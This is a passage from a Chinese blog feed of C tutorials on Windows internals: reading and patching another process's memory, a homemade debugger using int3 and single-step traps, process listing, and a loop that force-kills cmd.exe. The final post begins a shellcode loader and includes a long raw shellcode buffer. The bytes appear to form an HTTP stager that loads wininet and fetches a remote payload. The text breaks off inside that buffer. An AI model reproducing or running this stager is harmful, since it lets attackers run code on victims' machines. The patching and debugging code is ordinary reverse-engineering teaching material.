    <content><![CDATA[<h4 id="读取内存"><a href="#读取内存" class="headerlink" title="读取内存"></a>读取内存</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"><span class="type">char</span>* p = <span class="number">0x00D02030</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> code = <span class="number">0</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">	STARTUPINFO  info = &#123; <span class="keyword">sizeof</span>(info) &#125;;</span><br><span class="line">	GetStartupInfo(&amp;info);</span><br><span class="line">	PROCESS_INFORMATION pinfo;</span><br><span class="line"></span><br><span class="line">	TCHAR szPath[] = TEXT(<span class="string">&quot;C:\\Users\\test\\Desktop\\AsmDEMO.exe&quot;</span>);</span><br><span class="line">	<span class="comment">//CreateProcess(szPath, NULL, NULL, NULL, NULL, DEBUG_PROCESS | DEBUG_ONLY_THIS_PROCESS, NULL, NULL, &amp;info, &amp;pinfo);</span></span><br><span class="line">	<span class="comment">//第六个参数可以改为null 读取不需要一定的权限</span></span><br><span class="line">	CreateProcess(szPath, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;info, &amp;pinfo);</span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">		ReadProcessMemory(pinfo.hProcess, p, &amp;code, <span class="number">1</span>, <span class="literal">NULL</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;地址:%p   数值%02x\n&quot;</span>, p, code);</span><br><span class="line">		Sleep(<span class="number">10</span>);</span><br><span class="line">		((<span class="type">char</span>*)p)++;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/89f9b82/5-1.png" alt="img"></p>
<h4 id="内存补丁"><a href="#内存补丁" class="headerlink" title="内存补丁"></a>内存补丁</h4><p>先生成一个asmdemo</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">;使用nmake或下列命令进行编译和链接</span><br><span class="line">;ml /c /coff HelloWorld.<span class="keyword">asm</span></span><br><span class="line">;Link /subsystem:windows HelloWorld.obj</span><br><span class="line">;*******************************************************</span><br><span class="line">;模式定义，初始化参数</span><br><span class="line">	<span class="number">.386</span>		;使用<span class="number">80386</span>处理器指令集</span><br><span class="line">	.model flat,stdcall		;用来定义程序工作的模式，flat:内存模式，stdcall:语言模式</span><br><span class="line">	option casemap:none		;是否对变量与子程序名大小写敏感，必须要进行设置</span><br><span class="line">	</span><br><span class="line">;*******************************************************</span><br><span class="line">;include头文件</span><br><span class="line">;*******************************************************</span><br><span class="line">include		windows.inc</span><br><span class="line">include		user32.inc</span><br><span class="line">includelib	user32.lib</span><br><span class="line">include		kernel32.inc</span><br><span class="line">includelib	kernel32.lib</span><br><span class="line"></span><br><span class="line">;*******************************************************</span><br><span class="line">;数据段</span><br><span class="line">;*******************************************************</span><br><span class="line">			.data</span><br><span class="line">szCaption	db	<span class="string">&#x27;标题&#x27;</span>,<span class="number">0</span></span><br><span class="line">szText1		db	<span class="string">&#x27;你好，bbbb!&#x27;</span>,<span class="number">0</span></span><br><span class="line">szText2		db	<span class="string">&#x27;你好，aasaa!&#x27;</span>,<span class="number">0</span></span><br><span class="line">;*******************************************************</span><br><span class="line">;代码段</span><br><span class="line">;*******************************************************</span><br><span class="line">			.code</span><br><span class="line">main proc</span><br><span class="line">		xor eax,eax</span><br><span class="line">		.<span class="keyword">if</span> eax</span><br><span class="line">			invoke MessageBoxA,<span class="literal">NULL</span>,offset szText1,offset szCaption,MB_OK</span><br><span class="line">		.<span class="keyword">else</span></span><br><span class="line">			invoke MessageBoxA,<span class="literal">NULL</span>,offset szText2,offset szCaption,MB_ICONSTOP</span><br><span class="line">		.endif</span><br><span class="line">			invoke ExitProcess,<span class="number">0</span></span><br><span class="line">main endp</span><br><span class="line"></span><br><span class="line">end</span><br></pre></td></tr></table></figure>

<p>使用vs本地调试器后 会自动编译成exe 如果再生成的话会提示错误</p>
<p><img src="/posts/89f9b82/5-2.png" alt="img"></p>
<p>但是在这里 创建进程后没法运行这个asmDemo.exe 最后发现需要将常量参数在执行前存一下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">	STARTUPINFO  info =&#123;<span class="keyword">sizeof</span>(info)&#125;;</span><br><span class="line">	GetStartupInfo(&amp;info);</span><br><span class="line">	PROCESS_INFORMATION pinfo = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//WinExec(&quot;C:\\Users\\test\\Desktop\\AsmDEMO.exe&quot;, SW_SHOW);</span></span><br><span class="line">	TCHAR szPath[] = TEXT(<span class="string">&quot;C:\\Users\\test\\Desktop\\AsmDEMO.exe&quot;</span>);</span><br><span class="line">	CreateProcess(szPath,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,&amp;info,&amp;pinfo);  </span><br><span class="line"></span><br><span class="line">	<span class="type">void</span>* p = <span class="number">0x00D02030</span>;	<span class="comment">//起始地址 OD查看</span></span><br><span class="line">	<span class="type">short</span> oldbyte = <span class="built_in">malloc</span>(<span class="number">2</span>);	<span class="comment">//原来的 分配两个字节</span></span><br><span class="line">	oldbyte = <span class="number">0x1574</span>;  <span class="comment">//小段存储   7415 原机器码</span></span><br><span class="line">	<span class="type">short</span>* newbyte = <span class="built_in">malloc</span>(<span class="number">2</span>); <span class="comment">//新修改的</span></span><br><span class="line"></span><br><span class="line">	HANDLE hd =  OpenProcess(PROCESS_ALL_ACCESS, TRUE, pinfo.dwProcessId);</span><br><span class="line"></span><br><span class="line">	ReadProcessMemory(hd, p,newbyte,<span class="number">2</span>,<span class="literal">NULL</span> );  <span class="comment">//从p开始读2个字节到cache缓冲区</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (oldbyte != *newbyte) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;不对，无法添加补丁 %p&quot;</span>,newbyte);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		*newbyte = <span class="number">0x9090</span>; <span class="comment">// nop机器码为90</span></span><br><span class="line">		WriteProcessMemory(hd, p, newbyte, <span class="number">2</span>, <span class="literal">NULL</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//修改后变为 bbbb</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/89f9b82/5-3.png" alt="img"></p>
<h4 id="中断"><a href="#中断" class="headerlink" title="中断"></a>中断</h4><h5 id="int中断"><a href="#int中断" class="headerlink" title="int中断"></a>int中断</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	eflags寄存器 tf=1 cpu进入单步中断</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> int3 = <span class="number">0xcc</span>;</span><br><span class="line"><span class="type">char</span>* 要下断点的地址 = <span class="number">0x00D0202C</span>;   <span class="comment">//void类型的地址无法做运算 要改成char型</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> 原来的机器码 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* 补丁地址 = <span class="number">0x00D02030</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span> 补丁 = <span class="number">0x9090</span>;	<span class="comment">//nop</span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> code = <span class="number">0</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">	STARTUPINFO  info = &#123; <span class="keyword">sizeof</span>(info) &#125;;</span><br><span class="line">	GetStartupInfo(&amp;info);</span><br><span class="line">	PROCESS_INFORMATION pinfo;</span><br><span class="line"></span><br><span class="line">	TCHAR szPath[] = TEXT(<span class="string">&quot;C:\\Users\\test\\Desktop\\AsmDEMO.exe&quot;</span>);</span><br><span class="line">	CreateProcess(szPath, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, DEBUG_PROCESS | DEBUG_ONLY_THIS_PROCESS, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;info, &amp;pinfo);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	CONTEXT 线程上下文;  <span class="comment">//存放各种寄存器</span></span><br><span class="line"></span><br><span class="line">	DEBUG_EVENT dbevent;</span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		WaitForDebugEvent(&amp;dbevent, INFINITE);  </span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (dbevent.dwDebugEventCode == EXIT_PROCESS_DEBUG_EVENT) &#123;  <span class="comment">//被调试 退出</span></span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (dbevent.dwDebugEventCode == CREATE_PROCESS_DEBUG_EVENT) &#123; <span class="comment">//进程被创建时</span></span><br><span class="line">			ReadProcessMemory(pinfo.hProcess, 要下断点的地址, &amp;原来的机器码, <span class="number">1</span>, <span class="literal">NULL</span>);</span><br><span class="line">			WriteProcessMemory(pinfo.hProcess, 要下断点的地址, &amp; int3, <span class="number">1</span>, <span class="literal">NULL</span>);</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;aaa\n&quot;</span>);</span><br><span class="line">			<span class="comment">//返回在ecx中	</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//当被调试进程发生异常事件，被调试进程开始执行第一条指令前 本事件发生一次发生 </span></span><br><span class="line">		<span class="comment">//以后只有 单步中断 和 断点中断 才会发生本事件</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(dbevent.dwDebugEventCode == EXCEPTION_DEBUG_EVENT) &#123;  </span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;bbb\n&quot;</span>);</span><br><span class="line">			<span class="keyword">if</span> (dbevent.u.Exception.ExceptionRecord.ExceptionCode == EXCEPTION_BREAKPOINT) &#123; <span class="comment">//   如果是断点中断 in3中断(cc)</span></span><br><span class="line">				</span><br><span class="line">				线程上下文.ContextFlags = CONTEXT_FULL;  <span class="comment">//context_full全部寄存器  context_segment段寄存器</span></span><br><span class="line"></span><br><span class="line">				GetThreadContext(pinfo.hThread, &amp;线程上下文); <span class="comment">//获取当前线程上下文</span></span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (线程上下文.Eip == 要下断点的地址 + <span class="number">1</span>) &#123;</span><br><span class="line">					WriteProcessMemory(pinfo.hProcess, 要下断点的地址, &amp;原来的机器码, <span class="number">1</span> ,<span class="literal">NULL</span>);   <span class="comment">//将原来的写回去</span></span><br><span class="line">					<span class="built_in">printf</span>(<span class="string">&quot;ccc\n&quot;</span>);</span><br><span class="line">					线程上下文.Eip--;</span><br><span class="line">					SetThreadContext(pinfo.hThread,&amp;线程上下文);</span><br><span class="line">					WriteProcessMemory(pinfo.hProcess, 补丁地址, &amp;补丁, <span class="number">2</span>, <span class="literal">NULL</span>);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		ContinueDebugEvent(dbevent.dwProcessId, dbevent.dwThreadId, DBG_CONTINUE);</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	CloseHandle(pinfo.hProcess);</span><br><span class="line">	CloseHandle(pinfo.hThread);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/89f9b82/5-4.png" alt="img"></p>
<h5 id="单步中断"><a href="#单步中断" class="headerlink" title="单步中断"></a>单步中断</h5><p>效果和在dosbox上的-t 单步中断相似</p>
<p>eflags寄存器 tf=1 cpu进入单步中断  然后tf会再置为0</p>
<p>eflags中tf在第九位  eflags  | 0x100</p>
<p><img src="/posts/89f9b82/5-5.png" alt="img"></p>
<p>在上面的基础上完善</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> int3 = <span class="number">0xcc</span>;</span><br><span class="line"><span class="type">char</span>* 要下断点的地址 = <span class="number">0x00D0202C</span>;   <span class="comment">//void类型的地址无法做运算 要改成char型</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> 原来的机器码 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* 补丁地址 = <span class="number">0x00D02030</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span> 补丁 = <span class="number">0x9090</span>;	<span class="comment">//nop</span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> code = <span class="number">0</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">	STARTUPINFO  info = &#123; <span class="keyword">sizeof</span>(info) &#125;;</span><br><span class="line">	GetStartupInfo(&amp;info);</span><br><span class="line">	PROCESS_INFORMATION pinfo;</span><br><span class="line"></span><br><span class="line">	TCHAR szPath[] = TEXT(<span class="string">&quot;C:\\Users\\test\\Desktop\\AsmDEMO.exe&quot;</span>);</span><br><span class="line">	CreateProcess(szPath, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, DEBUG_PROCESS | DEBUG_ONLY_THIS_PROCESS, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;info, &amp;pinfo);</span><br><span class="line"></span><br><span class="line">	CONTEXT 线程上下文;  <span class="comment">//存放各种寄存器</span></span><br><span class="line"></span><br><span class="line">	DEBUG_EVENT dbevent;</span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		WaitForDebugEvent(&amp;dbevent, INFINITE);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (dbevent.dwDebugEventCode == EXIT_PROCESS_DEBUG_EVENT) &#123;  <span class="comment">//被调试 退出</span></span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (dbevent.dwDebugEventCode == CREATE_PROCESS_DEBUG_EVENT) &#123; <span class="comment">//进程被创建时</span></span><br><span class="line">			ReadProcessMemory(pinfo.hProcess, 要下断点的地址, &amp;原来的机器码, <span class="number">1</span>, <span class="literal">NULL</span>);</span><br><span class="line">			WriteProcessMemory(pinfo.hProcess, 要下断点的地址, &amp;int3, <span class="number">1</span>, <span class="literal">NULL</span>);</span><br><span class="line">			<span class="comment">//printf(&quot;aaa\n&quot;);</span></span><br><span class="line">			<span class="comment">//返回在ecx中	</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//当被调试进程发生异常事件，被调试进程开始执行第一条指令前 本事件发生一次发生 </span></span><br><span class="line">		<span class="comment">//以后只有 单步中断 和 断点中断 才会发生本事件</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (dbevent.dwDebugEventCode == EXCEPTION_DEBUG_EVENT) &#123;</span><br><span class="line">			<span class="comment">//printf(&quot;bbb\n&quot;);</span></span><br><span class="line">			<span class="keyword">if</span> (dbevent.u.Exception.ExceptionRecord.ExceptionCode == EXCEPTION_BREAKPOINT) &#123; <span class="comment">//   如果是断点中断 in3中断(cc)</span></span><br><span class="line"></span><br><span class="line">				线程上下文.ContextFlags = CONTEXT_FULL;  <span class="comment">//context_full全部寄存器  context_segment段寄存器</span></span><br><span class="line">				GetThreadContext(pinfo.hThread, &amp;线程上下文); <span class="comment">//获取当前线程上下文</span></span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (线程上下文.Eip == 要下断点的地址 + <span class="number">1</span>) &#123;</span><br><span class="line">					WriteProcessMemory(pinfo.hProcess, 要下断点的地址, &amp;原来的机器码, <span class="number">1</span>, <span class="literal">NULL</span>);   <span class="comment">//将原来的写回去</span></span><br><span class="line">					<span class="comment">//printf(&quot;ccc\n&quot;);</span></span><br><span class="line">					线程上下文.Eip--;</span><br><span class="line">					线程上下文.EFlags |= <span class="number">0x100</span>;  <span class="comment">//设置单步中断</span></span><br><span class="line">					SetThreadContext(pinfo.hThread, &amp;线程上下文);</span><br><span class="line"></span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span>(dbevent.u.Exception.ExceptionRecord.ExceptionCode == EXCEPTION_SINGLE_STEP) <span class="comment">//如果是单步中断</span></span><br><span class="line">			&#123;</span><br><span class="line">				线程上下文.ContextFlags = CONTEXT_FULL;  <span class="comment">//context_full全部寄存器  context_segment段寄存器</span></span><br><span class="line">				GetThreadContext(pinfo.hThread, &amp; 线程上下文);</span><br><span class="line">				<span class="built_in">putchar</span>(<span class="string">&#x27;-&#x27;</span>);</span><br><span class="line">				<span class="type">char</span> ch = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">				<span class="built_in">scanf</span>(<span class="string">&quot;%c&quot;</span>, &amp;ch); <span class="comment">//输入一个字符</span></span><br><span class="line">				getchar();<span class="comment">//回车</span></span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;寄存器eip:%08x  eflags:%08x  esp:%08x\n&quot;</span>, 线程上下文.Eip, 线程上下文.EFlags, 线程上下文.Esp);</span><br><span class="line"></span><br><span class="line">				<span class="comment">//进入单步中断后 tf会再置为0 所以要在重新设置为1</span></span><br><span class="line">				线程上下文.EFlags |= <span class="number">0x100</span>;</span><br><span class="line">				SetThreadContext(pinfo.hThread, &amp;线程上下文);</span><br><span class="line">				</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		ContinueDebugEvent(dbevent.dwProcessId, dbevent.dwThreadId, DBG_CONTINUE);</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	CloseHandle(pinfo.hProcess);</span><br><span class="line">	CloseHandle(pinfo.hThread);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/89f9b82/5-6.png" alt="img"></p>
]]></content>
      <categories>
        <category>C</category>
      </categories>
      <tags>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title>C-04_进程遍历与关闭</title>
    <url>/posts/279ff9df/</url>
    <content><![CDATA[<h4 id="进程遍历"><a href="#进程遍历" class="headerlink" title="进程遍历"></a>进程遍历</h4><p>效果类似于tasklist</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    HANDLE hd =  CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,<span class="number">0</span>);  <span class="comment">//遍历所有进程</span></span><br><span class="line">    PROCESSENTRY32 pe;</span><br><span class="line">    pe.dwSize = <span class="keyword">sizeof</span>(pe);</span><br><span class="line"></span><br><span class="line">    Process32First(hd, &amp;pe);</span><br><span class="line">    <span class="keyword">while</span> (Process32Next(hd, &amp;pe)) &#123;</span><br><span class="line">        <span class="comment">//szExeFile是WCHAR宽字符型，把%s改成%ls就可以了  如果使用%s只会显示第一个字母(我这里默认字符集是使用Unicode字符集)</span></span><br><span class="line">        <span class="comment">// 或者将项目字符集修改为 未设置即可</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%ls      %d\n&quot;</span>, pe.szExeFile, pe.th32ProcessID);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    CloseHandle(hd);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="进程关闭"><a href="#进程关闭" class="headerlink" title="进程关闭"></a>进程关闭</h4><p>强制 关闭进程/线程   TerminateProcess()</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_DEPRECATE 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_NONSTDC_NO_DEPRECATE 1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	HANDLE hd =  CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,<span class="number">0</span>);  <span class="comment">//遍历所有进程</span></span><br><span class="line">	PROCESSENTRY32 pe;</span><br><span class="line">	pe.dwSize = <span class="keyword">sizeof</span>(pe);</span><br><span class="line"></span><br><span class="line">	Process32First(hd, &amp;pe);</span><br><span class="line"></span><br><span class="line">	<span class="type">char</span>* name = <span class="string">&quot;cmd.exe&quot;</span>;</span><br><span class="line">	<span class="keyword">while</span> (Process32Next(hd, &amp;pe)) &#123;</span><br><span class="line">		</span><br><span class="line">		<span class="comment">//printf(&quot;%s      %d\n&quot;, pe.szExeFile, pe.th32ProcessID);</span></span><br><span class="line">		HANDLE ClosedProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, pe.th32ProcessID);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> ((stricmp(<span class="string">&quot;cmd.exe&quot;</span>,pe.szExeFile))== <span class="number">0</span>) &#123;<span class="comment">// stricmp i 忽略大小写</span></span><br><span class="line">			<span class="comment">//stricmp 要在前面加上两行注释 不然会报错  #define _CRT_SECURE_NO_DEPRECATE 1 和 #define _CRT_NONSTDC_NO_DEPRECATE 1</span></span><br><span class="line"></span><br><span class="line">			TerminateProcess(ClosedProcess, <span class="number">-1</span>);</span><br><span class="line">			</span><br><span class="line">		&#125; </span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	CloseHandle(hd);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>C</category>
      </categories>
      <tags>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title>C-03_加载shellcode</title>
    <url>/posts/61fea0e9/</url>
    <content><![CDATA[<h4 id="加载shellcode到内存执行"><a href="#加载shellcode到内存执行" class="headerlink" title="加载shellcode到内存执行"></a>加载shellcode到内存执行</h4><h5 id="1"><a href="#1" class="headerlink" title="1"></a>1</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x6e\x65\x74\x00\x68\x77\x69\x6e\x69\x54\x68\x4c\x77\x26\x07\xff\xd5\x31\xff\x57\x57\x57\x57\x57\x68\x3a\x56\x79\xa7\xff\xd5\xe9\x84\x00\x00\x00\x5b\x31\xc9\x51\x51\x6a\x03\x51\x51\x68\x50\x00\x00\x00\x53\x50\x68\x57\x89\x9f\xc6\xff\xd5\xeb\x70\x5b\x31\xd2\x52\x68\x00\x02\x40\x84\x52\x52\x52\x53\x52\x50\x68\xeb\x55\x2e\x3b\xff\xd5\x89\xc6\x83\xc3\x50\x31\xff\x57\x57\x6a\xff\x53\x56\x68\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x84\xc3\x01\x00\x00\x31\xff\x85\xf6\x74\x04\x89\xf9\xeb\x09\x68\xaa\xc5\xe2\x5d\xff\xd5\x89\xc1\x68\x45\x21\x5e\x31\xff\xd5\x31\xff\x57\x6a\x07\x51\x56\x50\x68\xb7\x57\xe0\x0b\xff\xd5\xbf\x00\x2f\x00\x00\x39\xc7\x74\xb7\x31\xff\xe9\x91\x01\x00\x00\xe9\xc9\x01\x00\x00\xe8\x8b\xff\xff\xff\x44\x6f\x67\x43\x73\x44\x6f\x67\x43\x73\x2e\x6a\x73\x00\xce\x32\x3f\xe1\xbc\x7e\xdf\x16\xc5\xec\xd3\x08\xa5\xa9\xfd\xe8\x0c\x62\x21\x9e\x58\x71\xdb\xc4\x1c\xb5\xb7\x6a\x51\x66\x5b\x16\x92\xe3\x50\x3e\xb9\x43\x9e\xab\xc4\xa6\x36\x6c\x68\xaa\x2a\x9c\xe8\xcd\x32\xc3\x22\x78\x77\x17\xb0\xb6\xae\x7d\x2c\xbb\x0c\x04\x0e\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x39\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x31\x3b\x20\x57\x4f\x57\x36\x34\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x35\x2e\x30\x29\x0d\x0a\x00\x99\xc4\xdc\xc9\x44\xd2\x8a\xbf\x32\xa7\x06\x20\x29\x57\x58\x03\x21\xae\xab\x53\x2b\x60\xe6\x68\xcd\xcb\xc0\xee\x23\xb5\x0b\xa0\xa7\xf0\x61\xec\x55\x34\x3e\x5c\xaa\xe3\x9f\xb0\x6c\xa8\xd3\x05\xfd\xb4\x9b\xad\xed\x36\x4b\xee\x9d\xec\xfa\x18\x6d\xf1\x33\xc7\x88\x3a\x64\x77\x98\x98\x26\x89\xcb\xa9\x51\x39\xe8\x50\xa5\xba\xaf\xe4\x9b\x2f\x51\x99\x44\xac\x5f\xcf\xbc\x8a\xac